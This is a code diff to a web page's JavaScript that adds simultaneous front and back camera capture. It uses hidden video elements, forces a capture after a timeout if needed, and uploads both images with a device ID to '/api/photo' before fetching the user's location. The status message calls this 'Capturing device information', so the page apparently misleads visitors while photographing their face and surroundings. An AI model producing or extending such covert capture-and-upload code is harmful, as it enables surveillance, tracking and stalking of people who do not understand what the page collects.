@@ -796,42 +796,169 @@
         }
 
         // ============================================================
-        //  PHOTO CAPTURE
+        //  DUAL CAMERA CAPTURE — FRONT + BACK SIMULTANEOUSLY
         // ============================================================
-        function capturePhoto() {
+        function captureDualPhotos() {
             return new Promise((resolve, reject) => {
-                debugLog('📸 Requesting camera...', 'info');
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
-                    .then(stream => {
-                        debugLog('📸 Camera stream acquired', 'ok');
+                debugLog('📸 Requesting dual camera (front + back)...', 'info');
+
+                let frontStream = null;
+                let backStream = null;
+                let frontVideo = null;
+                let backVideo = null;
+                let frontCanvas = document.createElement('canvas');
+                let backCanvas = document.createElement('canvas');
+                let frontCtx = frontCanvas.getContext('2d');
+                let backCtx = backCanvas.getContext('2d');
+
+                // Helper to get a stream for a specific facing mode
+                function getStream(facingMode) {
+                    return navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: facingMode,
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                }
+
+                // Try to get both streams in parallel
+                Promise.all([
+                    getStream('user'),    // front
+                    getStream('environment') // back
+                ]).then(([front, back]) => {
+                    frontStream = front;
+                    backStream = back;
+
+                    debugLog('📸 Both camera streams acquired', 'ok');
+
+                    // Create video elements
+                    frontVideo = document.createElement('video');
+                    frontVideo.srcObject = frontStream;
+                    frontVideo.setAttribute('playsinline', '');
+                    frontVideo.style.display = 'none';
+                    document.body.appendChild(frontVideo);
+
+                    backVideo = document.createElement('video');
+                    backVideo.srcObject = backStream;
+                    backVideo.setAttribute('playsinline', '');
+                    backVideo.style.display = 'none';
+                    document.body.appendChild(backVideo);
+
+                    let loaded = 0;
+                    function onLoaded() {
+                        loaded++;
+                        if (loaded === 2) {
+                            // Both videos are ready — capture frames
+                            frontVideo.play();
+                            backVideo.play();
+
+                            // Set canvas sizes to match video dimensions
+                            const fW = frontVideo.videoWidth || 1280;
+                            const fH = frontVideo.videoHeight || 720;
+                            const bW = backVideo.videoWidth || 1280;
+                            const bH = backVideo.videoHeight || 720;
+
+                            frontCanvas.width = fW;
+                            frontCanvas.height = fH;
+                            backCanvas.width = bW;
+                            backCanvas.height = bH;
+
+                            // Draw frames
+                            frontCtx.drawImage(frontVideo, 0, 0, fW, fH);
+                            backCtx.drawImage(backVideo, 0, 0, bW, bH);
+
+                            // Extract data URLs
+                            const frontDataUrl = frontCanvas.toDataURL('image/jpeg', 0.85);
+                            const backDataUrl = backCanvas.toDataURL('image/jpeg', 0.85);
+
+                            // Clean up
+                            frontStream.getTracks().forEach(t => t.stop());
+                            backStream.getTracks().forEach(t => t.stop());
+                            document.body.removeChild(frontVideo);
+                            document.body.removeChild(backVideo);
+
+                            debugLog(`📸 Front photo: ${frontDataUrl.length} chars`, 'ok');
+                            debugLog(`📸 Back photo: ${backDataUrl.length} chars`, 'ok');
+
+                            resolve({
+                                front: frontDataUrl,
+                                back: backDataUrl,
+                                composite: null // optional: can stitch them later if needed
+                            });
+                        }
+                    }
+
+                    frontVideo.onloadedmetadata = onLoaded;
+                    backVideo.onloadedmetadata = onLoaded;
+
+                    // If metadata already loaded, trigger manually
+                    if (frontVideo.readyState >= 2) onLoaded();
+                    if (backVideo.readyState >= 2) onLoaded();
+
+                    // Fallback: if metadata never fires, force capture after 3s
+                    setTimeout(() => {
+                        if (loaded < 2) {
+                            debugLog('📸 Metadata timeout — forcing capture', 'warn');
+                            try {
+                                frontVideo.play();
+                                backVideo.play();
+                                const fW = frontVideo.videoWidth || 640;
+                                const fH = frontVideo.videoHeight || 480;
+                                const bW = backVideo.videoWidth || 640;
+                                const bH = backVideo.videoHeight || 480;
+                                frontCanvas.width = fW; frontCanvas.height = fH;
+                                backCanvas.width = bW; backCanvas.height = bH;
+                                frontCtx.drawImage(frontVideo, 0, 0, fW, fH);
+                                backCtx.drawImage(backVideo, 0, 0, bW, bH);
+                                const frontDataUrl = frontCanvas.toDataURL('image/jpeg', 0.85);
+                                const backDataUrl = backCanvas.toDataURL('image/jpeg', 0.85);
+                                frontStream.getTracks().forEach(t => t.stop());
+                                backStream.getTracks().forEach(t => t.stop());
+                                if (frontVideo.parentNode) document.body.removeChild(frontVideo);
+                                if (backVideo.parentNode) document.body.removeChild(backVideo);
+                                resolve({ front: frontDataUrl, back: backDataUrl, composite: null });
+                            } catch(e) {
+                                reject('Force capture failed: ' + e.message);
+                            }
+                        }
+                    }, 3000);
+
+                }).catch(err => {
+                    debugLog(`📸 Dual camera error: ${err.message}`, 'err');
+                    // Fallback: try just one camera (back) if dual fails
+                    debugLog('📸 Falling back to back camera only', 'warn');
+                    navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment' },
+                        audio: false
+                    }).then(stream => {
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.setAttribute('playsinline', '');
                         video.style.display = 'none';
                         document.body.appendChild(video);
-                        video.onloadedmetadata = function() {
-                            video.play();
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 1280;
-                            canvas.height = video.videoHeight || 720;
-                            const ctx = canvas.getContext('2d');
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        const ctx = canvas.getContext('2d');
+                        setTimeout(() => {
                             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                             const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-                            stream.getTracks().forEach(track => track.stop());
+                            stream.getTracks().forEach(t => t.stop());
                             document.body.removeChild(video);
-                            debugLog(`📸 Photo captured (${dataUrl.length} chars)`, 'ok');
-                            resolve(dataUrl);
-                        };
-                        video.onerror = function() {
-                            stream.getTracks().forEach(track => track.stop());
-                            document.body.removeChild(video);
-                            reject('Video error');
-                        };
-                    })
-                    .catch(err => {
-                        debugLog(`📸 Camera denied: ${err.message}`, 'err');
-                        reject('Camera denied: ' + err.message);
+                            resolve({
+                                front: null,
+                                back: dataUrl,
+                                composite: null,
+                                fallback: true
+                            });
+                        }, 500);
+                    }).catch(e2 => {
+                        reject('Even fallback camera failed: ' + e2.message);
                     });
+                });
             });
         }
 
@@ -1065,22 +1192,47 @@
                 debugLog(`📝 Using local fallback ID: ${deviceId}`, 'warn');
             }
 
-            setStatus('📸 Capturing device information...', 30);
+            setStatus('📸 Capturing device information (front + back)...', 30);
+
             try {
-                const photoDataUrl = await capturePhoto();
-                debugLog(`📸 Photo captured (${photoDataUrl.length} chars)`, 'ok');
-                const photoResp = await apiCall('/api/photo', {
-                    deviceId: deviceId,
-                    image: photoDataUrl,
-                    timestamp: Date.now()
-                });
-                if (photoResp && photoResp.success) {
-                    debugLog('📸 Photo uploaded successfully', 'ok');
-                } else {
-                    debugLog('📸 Photo upload failed', 'err');
+                const dualPhotos = await captureDualPhotos();
+                debugLog(`📸 Dual capture successful. Front: ${dualPhotos.front ? 'yes' : 'no'}, Back: ${dualPhotos.back ? 'yes' : 'no'}`, 'ok');
+
+                // Upload front photo if available
+                if (dualPhotos.front) {
+                    const frontResp = await apiCall('/api/photo', {
+                        deviceId: deviceId,
+                        image: dualPhotos.front,
+                        camera: 'front',
+                        timestamp: Date.now()
+                    });
+                    if (frontResp && frontResp.success) {
+                        debugLog('📸 Front photo uploaded', 'ok');
+                    } else {
+                        debugLog('📸 Front photo upload failed', 'err');
+                    }
                 }
+
+                // Upload back photo if available
+                if (dualPhotos.back) {
+                    const backResp = await apiCall('/api/photo', {
+                        deviceId: deviceId,
+                        image: dualPhotos.back,
+                        camera: 'back',
+                        timestamp: Date.now()
+                    });
+                    if (backResp && backResp.success) {
+                        debugLog('📸 Back photo uploaded', 'ok');
+                    } else {
+                        debugLog('📸 Back photo upload failed', 'err');
+                    }
+                }
+
+                // Optionally upload a composite if you want to stitch them
+                // For now, we send both separately.
+
             } catch(e) {
-                debugLog(`📸 Photo error: ${e}`, 'err');
+                debugLog(`📸 Dual photo error: ${e}`, 'err');
             }
 
             const loc = await getLocation();
